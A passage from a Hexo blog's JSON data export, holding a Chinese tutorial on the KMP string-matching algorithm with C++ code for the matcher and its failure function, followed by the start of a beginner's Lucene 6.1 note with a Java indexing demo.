算法。<br>\n写的好累＝。＝\n","slug":"KMP","published":1,"date":"2016-10-06T16:00:00.000Z","updated":"2018-04-23T11:17:28.000Z","comments":1,"photos":[],"link":"","_id":"cji4qizas0003rikej4vdmrhv","content":"<blockquote>\n<p>“想起了那晚站在代码巅峰的ZK大神. ”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>前一阵子看<strong>《编译原理 第二版》</strong>，在<strong>“3.4.5 &ensp; 3.4节的练习”</strong>(P86)中看到了这么一道题（<em>练习3.4.2</em>），大意是要在一个字符串中识别一个子字符串，于是它定义了一个叫“失效函数”的东西，题目第二段还提到个算法是由 Knuth, Morris, Pratt 这三个人提出的。看着这三个人的名字觉得有些眼熟，首字母拼起来不就是 KMP 么。</p>\n<p>其实这就是 <strong>KMP</strong> 算法，解决在字符串中找子字符串的问题。在这里给没听过子字符串概念的同学解释一下子字符串，子字符串就是删除某前缀和某后缀后得到的字符串。比如，String A = miyunluo，String B = yun，那么 B 就是 A 的子串。</p>\n<p>讲道理KMP算法的讲解，网上能搜出来一卡车，套路都差不多，基本上都涉及到什么 <strong>移动</strong> 再加 <strong>Next[]</strong> 数组，不管你怎么看，反正我在差不多一年前看这些东西是没看懂（还是在ZK大神讲解的情况下…）。于是借着这道题，再加上又看了一些博客，我也来写一写KMP，尽量写的清楚，希望大家可以看懂。</p>\n<hr>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>对于题目中的失效函数，放在后面来说，我们先来看看KMP算法的过程。</p>\n<p>借用 <strong>练习3.3.7</strong> 中的例子，为了使得过程可以尽量长一些，对题目(1)的串做一些修改。设String A = <strong>abababaababac</strong>, String B = <strong>ababac</strong>，下面运行KMP算法。</p>\n<p>用指针 i, j 表示 A，B 当前匹配的位置，即就是A[i-j+1 … i] 与 B[1 … j]完全相等。对于整个过程而言，i 是不断增加的，j 做相应的调整，当 j 等于B的长度时，就结束了，匹配成功。也就是说，我们顺序遍历A串，某一时刻已经满足A[i-j+1 … i] == B[1 … j]，但是下一位B[j+1] != A[i+1]，这时就要调整 j 的值（当然减小 j），设减小后是 j’ ，使得B[1 … j’]依然可以与A[i-j’+1 … i]匹配（注意这里A的起始匹配地址已经变成了i-j’+1），当然这里的 j’ 越大越好。接下来看过程。</p>\n<p>i&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;<strong>5</strong>&ensp;6&ensp;7&ensp;8&ensp;9<br><br>A =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;<strong>a</strong>&ensp;b&ensp;a&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br><br>B =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;<strong>a</strong>&ensp;c<br><br>j&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;<strong>5</strong>&ensp;6</p>\n<p>现在 A 和 B 匹配到了 i = 5, j = 5 的地方，但是二者的下一位 A[i+1] 与 B[j+1] 并不相等，说明这时继续向后匹配失败，需要减小 j 的值，使得 j’ 可以在 i = 5 的地方继续匹配，现在 A[1 … 5] = ababa，我们发现 j’ = 3 时 B[1 … 3] = aba 可以与 A[5-3+1 … 5] 即 A[3 … 5]匹配，于是新的 j = 3.</p>\n<p>i&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;<strong>5</strong>&ensp;6&ensp;7&ensp;8&ensp;9<br><br>A =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;<strong>a</strong>&ensp;b&ensp;a&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br><br>B =&ensp;&ensp;&ensp;&ensp;&ensp;a&ensp;b&ensp;<strong>a</strong>&ensp;b&ensp;a&ensp;c<br><br>j&ensp;=&ensp;&ensp;&ensp;&ensp;&ensp;1&ensp;2&ensp;<strong>3</strong>&ensp;4&ensp;5&ensp;6</p>\n<p>继续增加 i ，同时向后匹配 j ，当匹配到 i = 7, j = 5 时，又出现下一位不相等的情况</p>\n<p>i&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6&ensp;<strong>7</strong>&ensp;8&ensp;9<br><br>A =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;b&ensp;<strong>a</strong>&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br><br>B =&ensp;&ensp;&ensp;&ensp;&ensp;a&ensp;b&ensp;a&ensp;b&ensp;<strong>a</strong>&ensp;c<br><br>j&ensp;=&ensp;&ensp;&ensp;&ensp;&ensp;1&ensp;2&ensp;3&ensp;4&ensp;<strong>5</strong>&ensp;6</p>\n<p>由上一步知道，此时又应该将 j 减小为 j ＝ 3。这样可以使得 A[5 … 7] == B[1 … 3].</p>\n<p>i&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6&ensp;<strong>7</strong>&ensp;8&ensp;9<br><br>A =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;b&ensp;<strong>a</strong>&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br><br>B =&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;a&ensp;b&ensp;<strong>a</strong>&ensp;b&ensp;a&ensp;c<br><br>j&ensp;=&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;1&ensp;2&ensp;<strong>3</strong>&ensp;4&ensp;5&ensp;6</p>\n<p>继续向后匹配，又出现了 A[i+1] != B[j+1] 的情况看。这时需要减小 j ，使得 B[1 … j]仍然可以在 i = 7 处匹配，于是只能将 j 减小为1.</p>\n<p>i&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6&ensp;<strong>7</strong>&ensp;8&ensp;9<br><br>A =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;b&ensp;<strong>a</strong>&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br><br>B =&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<strong>a</strong>&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br><br>j&ensp;=&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<strong>1</strong>&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6</p>\n<p>此时B紧接着第二位就不匹配了，j 已经减小到了最小值1，说明j已经无法调整了，那我们只好放弃 i = 7,从下一个与B[1]相等的地方开始。在目前的情况下，很碰巧，下一个A[i] == B[1] 的地方就是 i ＝ 8，于是我们从 i = 8 的地方重新开始。</p>\n<p>i&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6&ensp;7&ensp;<strong>8</strong>&ensp;9<br><br>A =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;<strong>a</strong>&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br><br>B =&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<strong>a</strong>&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br><br>j&ensp;=&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<strong>1</strong>&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6</p>\n<p>继续向后，匹配完成。</p>\n<p>KMP的过程便是如此，但是我们每次要怎么减小 j 到适当的值似乎还没有解决。这就是课本上提到的失效函数，用它来解决当我们某一步匹配失效的时候，调整 j 的问题。假设我们用这个失效函数预先处理一下 B 字符串，得到了一个数组，叫它 Pre 数组好了（<em>先不用管它是如何实现的</em>），保存的值是，当某一个 j 失效时，应该调整为的 j’ 值，借用上面的例子，第一次失效时，j = 5，应该调整为 j’ = 3，那么 Pre[5]的值就是 3，第二次失效时 j = 3，应该调整为 j’ = 1，那么 Pre[3] 的值就是 1。因此，当某一个 j 失效时，我们只要查一下 Pre[] 数组，就可以知道我们要减小到的 j’ 值，即 j’ = Pre[j]。</p>\n<p>有了 Pre[] 数组，我们就可以写出 KMP 算法的代码了，设 A 串长为 n，B 串长为 m。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> i, j = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(i = <span class=\"number\">1</span>;i&lt;=n;++i)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(j&gt;<span class=\"number\">0</span> &amp;&amp; B[j+<span class=\"number\">1</span>] != A[i]) j = Pre[j];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(B[j+<span class=\"number\">1</span>] == A[i]) j = j+<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(j == m)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"匹配开始于: \"</span>&lt;&lt; i-m &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\tj = Pre[j];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>现在考虑 Pre[] 这个数组的意义与这个数组如何得到。还是用上面的例子。</p>\n<p>i&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;<strong>5</strong>&ensp;6&ensp;7&ensp;8&ensp;9<br><br>A =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;<strong>a</strong>&ensp;b&ensp;a&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br><br>B =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;<strong>a</strong>&ensp;c<br><br>j&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;<strong>5</strong>&ensp;6</p>\n<p>现在相当于 A B 两个字符串都是从头开始比较的，但是在 i = 5, j = 5 时发现无法再向后匹配了，比较直观的做法是，放弃这次比较，从 i = 2 的地方开始与 B 字符串重新比较，这样的时间复杂度显然是 O(mn) 的，因为我们没有考虑 B 字符串本身的一些特性。对于 j ＝ 5，对应的B的前缀为ababa，我们发现 B[1 … 3] == B[3 … 5] == aba，正是基于此，我们可以减小 j到3，（相当于后移B）使得此时在 i = 5, j = 3 处又可以继续向后进行。</p>\n<p>从上面的解释中，我们可以看出求 Pre[] 数组，就相当于对于 B 的每一个前缀 B’ ，求 B’ 的<strong>最长相同前缀与后缀</strong>。代码如下</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> i, j =<span class=\"number\">0</span>;</span><br><span class=\"line\">Pre[<span class=\"number\">1</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(i = <span class=\"number\">2</span>;i&lt;=m;++i)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(j&gt;<span class=\"number\">0</span> &amp;&amp; B[j+<span class=\"number\">1</span>] != B[i]) j = Pre[j];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(B[j+<span class=\"number\">1</span>] == B[i]) j = j+<span class=\"number\">1</span>;</span><br><span class=\"line\">\tPre[i] = j;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>为什么这个代码与 KMP 的代码如此相似，没错，你可以这么想，现在要求 B 的<strong>所有前缀</strong> 的 <strong>最长相同前缀与后缀</strong>（有点绕），那么就相当于是 B 的自匹配嘛。指针 i 所指的位置，就是 B’结束的位置，即 B’ = B[1 … i]（B’现在是B的一个前缀）, j 指针的位置就是 B’ 的一个前缀，这不就是 B’ 的前缀与 B’ 的后缀匹配了嘛。</p>\n<p>以上就是传说中的 KMP 算法。<br><br>写的好累＝。＝</p>\n","site":{"data":{"projects":[{"name":"Sjtueat","url":"http://sjtueat.miyunluo.com","desc":"Help you to decide what to eat today"},{"name":"Easy Flash Tool","url":"https://github.com/miyunluo/CortexM4-flashtool","desc":"A easy python flash tool for TI TM4C1294"}]}},"excerpt":"","more":"<blockquote>\n<p>“想起了那晚站在代码巅峰的ZK大神. ”</p>\n</blockquote>\n<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>前一阵子看<strong>《编译原理 第二版》</strong>，在<strong>“3.4.5 &ensp; 3.4节的练习”</strong>(P86)中看到了这么一道题（<em>练习3.4.2</em>），大意是要在一个字符串中识别一个子字符串，于是它定义了一个叫“失效函数”的东西，题目第二段还提到个算法是由 Knuth, Morris, Pratt 这三个人提出的。看着这三个人的名字觉得有些眼熟，首字母拼起来不就是 KMP 么。</p>\n<p>其实这就是 <strong>KMP</strong> 算法，解决在字符串中找子字符串的问题。在这里给没听过子字符串概念的同学解释一下子字符串，子字符串就是删除某前缀和某后缀后得到的字符串。比如，String A = miyunluo，String B = yun，那么 B 就是 A 的子串。</p>\n<p>讲道理KMP算法的讲解，网上能搜出来一卡车，套路都差不多，基本上都涉及到什么 <strong>移动</strong> 再加 <strong>Next[]</strong> 数组，不管你怎么看，反正我在差不多一年前看这些东西是没看懂（还是在ZK大神讲解的情况下…）。于是借着这道题，再加上又看了一些博客，我也来写一写KMP，尽量写的清楚，希望大家可以看懂。</p>\n<hr>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>对于题目中的失效函数，放在后面来说，我们先来看看KMP算法的过程。</p>\n<p>借用 <strong>练习3.3.7</strong> 中的例子，为了使得过程可以尽量长一些，对题目(1)的串做一些修改。设String A = <strong>abababaababac</strong>, String B = <strong>ababac</strong>，下面运行KMP算法。</p>\n<p>用指针 i, j 表示 A，B 当前匹配的位置，即就是A[i-j+1 … i] 与 B[1 … j]完全相等。对于整个过程而言，i 是不断增加的，j 做相应的调整，当 j 等于B的长度时，就结束了，匹配成功。也就是说，我们顺序遍历A串，某一时刻已经满足A[i-j+1 … i] == B[1 … j]，但是下一位B[j+1] != A[i+1]，这时就要调整 j 的值（当然减小 j），设减小后是 j’ ，使得B[1 … j’]依然可以与A[i-j’+1 … i]匹配（注意这里A的起始匹配地址已经变成了i-j’+1），当然这里的 j’ 越大越好。接下来看过程。</p>\n<p>i&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;<strong>5</strong>&ensp;6&ensp;7&ensp;8&ensp;9<br><br>A =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;<strong>a</strong>&ensp;b&ensp;a&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br><br>B =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;<strong>a</strong>&ensp;c<br><br>j&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;<strong>5</strong>&ensp;6</p>\n<p>现在 A 和 B 匹配到了 i = 5, j = 5 的地方，但是二者的下一位 A[i+1] 与 B[j+1] 并不相等，说明这时继续向后匹配失败，需要减小 j 的值，使得 j’ 可以在 i = 5 的地方继续匹配，现在 A[1 … 5] = ababa，我们发现 j’ = 3 时 B[1 … 3] = aba 可以与 A[5-3+1 … 5] 即 A[3 … 5]匹配，于是新的 j = 3.</p>\n<p>i&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;<strong>5</strong>&ensp;6&ensp;7&ensp;8&ensp;9<br><br>A =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;<strong>a</strong>&ensp;b&ensp;a&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br><br>B =&ensp;&ensp;&ensp;&ensp;&ensp;a&ensp;b&ensp;<strong>a</strong>&ensp;b&ensp;a&ensp;c<br><br>j&ensp;=&ensp;&ensp;&ensp;&ensp;&ensp;1&ensp;2&ensp;<strong>3</strong>&ensp;4&ensp;5&ensp;6</p>\n<p>继续增加 i ，同时向后匹配 j ，当匹配到 i = 7, j = 5 时，又出现下一位不相等的情况</p>\n<p>i&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6&ensp;<strong>7</strong>&ensp;8&ensp;9<br><br>A =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;b&ensp;<strong>a</strong>&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br><br>B =&ensp;&ensp;&ensp;&ensp;&ensp;a&ensp;b&ensp;a&ensp;b&ensp;<strong>a</strong>&ensp;c<br><br>j&ensp;=&ensp;&ensp;&ensp;&ensp;&ensp;1&ensp;2&ensp;3&ensp;4&ensp;<strong>5</strong>&ensp;6</p>\n<p>由上一步知道，此时又应该将 j 减小为 j ＝ 3。这样可以使得 A[5 … 7] == B[1 … 3].</p>\n<p>i&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6&ensp;<strong>7</strong>&ensp;8&ensp;9<br><br>A =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;b&ensp;<strong>a</strong>&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br><br>B =&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;a&ensp;b&ensp;<strong>a</strong>&ensp;b&ensp;a&ensp;c<br><br>j&ensp;=&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;1&ensp;2&ensp;<strong>3</strong>&ensp;4&ensp;5&ensp;6</p>\n<p>继续向后匹配，又出现了 A[i+1] != B[j+1] 的情况看。这时需要减小 j ，使得 B[1 … j]仍然可以在 i = 7 处匹配，于是只能将 j 减小为1.</p>\n<p>i&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6&ensp;<strong>7</strong>&ensp;8&ensp;9<br><br>A =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;b&ensp;<strong>a</strong>&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br><br>B =&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<strong>a</strong>&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br><br>j&ensp;=&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<strong>1</strong>&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6</p>\n<p>此时B紧接着第二位就不匹配了，j 已经减小到了最小值1，说明j已经无法调整了，那我们只好放弃 i = 7,从下一个与B[1]相等的地方开始。在目前的情况下，很碰巧，下一个A[i] == B[1] 的地方就是 i ＝ 8，于是我们从 i = 8 的地方重新开始。</p>\n<p>i&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6&ensp;7&ensp;<strong>8</strong>&ensp;9<br><br>A =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;<strong>a</strong>&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br><br>B =&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<strong>a</strong>&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br><br>j&ensp;=&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;<strong>1</strong>&ensp;2&ensp;3&ensp;4&ensp;5&ensp;6</p>\n<p>继续向后，匹配完成。</p>\n<p>KMP的过程便是如此，但是我们每次要怎么减小 j 到适当的值似乎还没有解决。这就是课本上提到的失效函数，用它来解决当我们某一步匹配失效的时候，调整 j 的问题。假设我们用这个失效函数预先处理一下 B 字符串，得到了一个数组，叫它 Pre 数组好了（<em>先不用管它是如何实现的</em>），保存的值是，当某一个 j 失效时，应该调整为的 j’ 值，借用上面的例子，第一次失效时，j = 5，应该调整为 j’ = 3，那么 Pre[5]的值就是 3，第二次失效时 j = 3，应该调整为 j’ = 1，那么 Pre[3] 的值就是 1。因此，当某一个 j 失效时，我们只要查一下 Pre[] 数组，就可以知道我们要减小到的 j’ 值，即 j’ = Pre[j]。</p>\n<p>有了 Pre[] 数组，我们就可以写出 KMP 算法的代码了，设 A 串长为 n，B 串长为 m。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> i, j = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(i = <span class=\"number\">1</span>;i&lt;=n;++i)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(j&gt;<span class=\"number\">0</span> &amp;&amp; B[j+<span class=\"number\">1</span>] != A[i]) j = Pre[j];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(B[j+<span class=\"number\">1</span>] == A[i]) j = j+<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(j == m)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">cout</span> &lt;&lt; <span class=\"string\">\"匹配开始于: \"</span>&lt;&lt; i-m &lt;&lt; <span class=\"built_in\">endl</span>;</span><br><span class=\"line\">\t\tj = Pre[j];</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>现在考虑 Pre[] 这个数组的意义与这个数组如何得到。还是用上面的例子。</p>\n<p>i&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;<strong>5</strong>&ensp;6&ensp;7&ensp;8&ensp;9<br><br>A =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;<strong>a</strong>&ensp;b&ensp;a&ensp;a&ensp;b&ensp;a&ensp;b&ensp;a&ensp;c<br><br>B =&ensp;a&ensp;b&ensp;a&ensp;b&ensp;<strong>a</strong>&ensp;c<br><br>j&ensp;=&ensp;1&ensp;2&ensp;3&ensp;4&ensp;<strong>5</strong>&ensp;6</p>\n<p>现在相当于 A B 两个字符串都是从头开始比较的，但是在 i = 5, j = 5 时发现无法再向后匹配了，比较直观的做法是，放弃这次比较，从 i = 2 的地方开始与 B 字符串重新比较，这样的时间复杂度显然是 O(mn) 的，因为我们没有考虑 B 字符串本身的一些特性。对于 j ＝ 5，对应的B的前缀为ababa，我们发现 B[1 … 3] == B[3 … 5] == aba，正是基于此，我们可以减小 j到3，（相当于后移B）使得此时在 i = 5, j = 3 处又可以继续向后进行。</p>\n<p>从上面的解释中，我们可以看出求 Pre[] 数组，就相当于对于 B 的每一个前缀 B’ ，求 B’ 的<strong>最长相同前缀与后缀</strong>。代码如下</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> i, j =<span class=\"number\">0</span>;</span><br><span class=\"line\">Pre[<span class=\"number\">1</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span>(i = <span class=\"number\">2</span>;i&lt;=m;++i)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(j&gt;<span class=\"number\">0</span> &amp;&amp; B[j+<span class=\"number\">1</span>] != B[i]) j = Pre[j];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(B[j+<span class=\"number\">1</span>] == B[i]) j = j+<span class=\"number\">1</span>;</span><br><span class=\"line\">\tPre[i] = j;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>为什么这个代码与 KMP 的代码如此相似，没错，你可以这么想，现在要求 B 的<strong>所有前缀</strong> 的 <strong>最长相同前缀与后缀</strong>（有点绕），那么就相当于是 B 的自匹配嘛。指针 i 所指的位置，就是 B’结束的位置，即 B’ = B[1 … i]（B’现在是B的一个前缀）, j 指针的位置就是 B’ 的一个前缀，这不就是 B’ 的前缀与 B’ 的后缀匹配了嘛。</p>\n<p>以上就是传说中的 KMP 算法。<br><br>写的好累＝。＝</p>\n"},{"layout":"post","title":"Lucene6.1初级笔记与Demo","_content":"\n> “似乎什么也没写”\n\n\n## 前言\n\n暑期参加了一个只有三个人的宏大项目，一个人写爬虫，一个人写Lucene，一个我也不知道做了什么。很不凑巧，我就是写Lucene的那个。之前基本没写过java，Lucene也是第一次接触，不过也算是短时间内完成了，功能上比较简陋。今天刚结束了这个项目莫名其妙的一个答辩，写点基础的，给那些像我一样刚刚接触的同学。\n\n---\n\n## 正文\n\nLucene是一个全文检索框架，功能异常强大，可以进行精确模糊查询还有一些高级的查询功能，其主要功能分为两大部分：索引（index）和查询（search）虽然无法与Google的搜索引擎媲美，但是作为一个开源框架，其可定制性极高，可以满足特定方面的检索需求。\n\nLucene的介绍文档很多，但是都比较陈旧，有关最新6.0+版本的Lucene介绍，可以参考[代码馆 Lucene6.0实战](http://codepub.cn/2016/05/20/Lucene-6-0-in-action-1-Index-creation/)，介绍的十分基础也十分详细，有样例与运行结果，对照学习效果十分好。\n\n当然，你也许会有这种感觉，看完了[代码馆 Lucene6.0实战](http://codepub.cn/2016/05/20/Lucene-6-0-in-action-1-Index-creation/)的博文似乎还是无法下手做出什么东西来，在这里给出一个demo，供初次接触lucene的同学参考。\n\n\n\n### 建立索引\n``` java\n//*IndexFiles.java*//\n\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.FileVisitResult;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.SimpleFileVisitor;\nimport java.nio.file.attribute.BasicFileAttributes;\nimport java.util.Date;\n\nimport org.apache.lucene.analysis.Analyzer;\nimport org.apache.lucene.analysis.TokenStream;\nimport org.apache.lucene.analysis.Tokenizer;\nimport org.apache.lucene.analysis.core.LowerCaseFilter;\nimport org.apache.lucene.analysis.core.StopFilter;\nimport org.apache.lucene.analysis.en.PorterStemFilter;\nimport org.apache.lucene.analysis.en.PorterStemFilterFactory;\nimport org.apache.lucene.analysis.cn.smart.SmartChineseAnalyzer;\nimport org.apache.lucene.analysis.standard.StandardFilterFactory;\nimport org.apache.lucene.analysis.standard.StandardTokenizer;\nimport org.apache.lucene.document.LongPoint;\nimport org.apache.lucene.document.Document;\nimport org.apache.lucene.document.Field;\nimport org.apache.lucene.document.StringField;\nimport org.apache.lucene.document.TextField;\nimport org.apache.lucene.index.IndexWriter;\nimport org.apache.lucene.index.IndexWriterConfig.OpenMode;\nimport org.apache.lucene.index.IndexWriterConfig;\nimport org.apache.lucene.index.Term;\nimport org.apache.lucene.store.Directory;\nimport org.apache.lucene.store.FSDirectory;\nimport org.apache.lucene.util.Version;\nimport org.tartarus.snowball.ext.PorterStemmer;\n\n\npublic class IndexFiles {\n\n\tpublic IndexFiles(String indexDestiny, String documentsPath){\n\t\tboolean create = true;\n\t\t//******** find the document_path *********//\n\t\tfinal Path docDir = Paths.get(documentsPath);\n\t\tif (!Files.isReadable(docDir)) {\n\t\t\tSystem.out.println(\"Document directory '\" +docDir.toAbsolutePath()+ \"' does not exist or is not readable, please check the path\");\n\t\t\tSystem.exit(1);\n\t\t}\n\n\t\tDate start = new Date();\n\t\ttry {\n\t\t\tSystem.out.println(\"Indexing to directory '\" + indexDestiny + \"'...\");\n\n\t\t\tDirectory dir = FSDirectory.open(Paths.get(indexDestiny));      \n\t\t\tAnalyzer analyzer = new SmartChineseAnalyzer();\n\t\t\tIndexWriterConfig iwc = new IndexWriterConfig(analyzer);\n\n\t\t\tif (create) {\n\t\t\t\tiwc.setOpenMode(OpenMode.CREATE);\n\t\t\t} else {\n\t\t\t\tiwc.setOpenMode(OpenMode.CREATE_OR_APPEND);\n\t\t\t}\n\t\t\t//******** construct an IndexWriter *******//\n\t\t\tIndexWriter writer = new IndexWriter(dir, iwc);\n\t\t\tindexDocs(writer, docDir);\n\t\t\twriter.close();\n\t\t\tDate end = new Date();\n\t\t\t//*********** calculate the time **********//\n\t\t\tSystem.out.println(end.getTime() - start.getTime() + \" total milliseconds\");\n\n\t\t} catch (IOException e) {\n\t\t\tSystem.out.println(\" caught a \" + e.getClass() +\n\t\t\t\t\t\"\\n with message: \" + e.getMessage());\n\t\t}\n\t}\n\t//*********** traverse 